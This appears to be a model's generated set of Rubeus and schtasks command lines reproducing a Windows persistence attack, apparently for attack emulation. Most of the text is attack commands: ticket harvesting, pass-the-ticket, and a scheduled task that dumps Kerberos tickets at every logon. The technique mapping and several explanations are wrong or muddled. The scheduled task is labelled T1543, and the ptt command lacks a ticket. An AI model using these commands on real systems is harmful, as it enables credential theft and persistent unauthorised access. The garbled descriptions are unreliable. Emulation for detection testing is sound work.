Based on the provided documentation and attack description, I will generate realistic command lines using only the tool Rubeus to reproduce the attack behavior.

The objective is to establish persistence by creating a scheduled task. The attack corresponds to MITRE technique T1543 (CREATE OR MODIFY SYSTEM PROCESS) under tactic TA0003 (PERSISTENCE).

Here are the generated command lines:

Command: `rubeus createnetonly /targetuser:<scheduled_task_user> /show`
This command creates a new hidden process with SECURITY_LOGON_TYPE of 9 (NewCredentials), equivalent to runas /netonly, allowing us to apply specific Kerberos tickets. The `/show` option reveals the process ID and LUID.

Command: `rubeus ptt /luid:<LUID> /targetuser:<scheduled_task_user>`
This command applies a Kerberos ticket with the specified LUID to the target user, simulating elevation and preventing TGT erasure for the current logon session.

Command: `rubeus harvest /targetuser:<scheduled_task_user> /interval:10`
This command monitors logon events and dumps new tickets, allowing us to automatically renew TGTs. The `/interval` parameter specifies the interval between ticket renewals.

To create a scheduled task:

Command: `schtasks /create /tn "<scheduled_task_name>" /tr "rubeus harvest /targetuser:<scheduled_task_user> /interval:10" /sc ONLOGON`
This command creates a new scheduled task with the specified name, triggering the Rubeus harvest command upon logon.

Note that I've used placeholders for the `<scheduled_task_user>` and `<scheduled_task_name>` variables, as these values are not explicitly specified in the attack description.
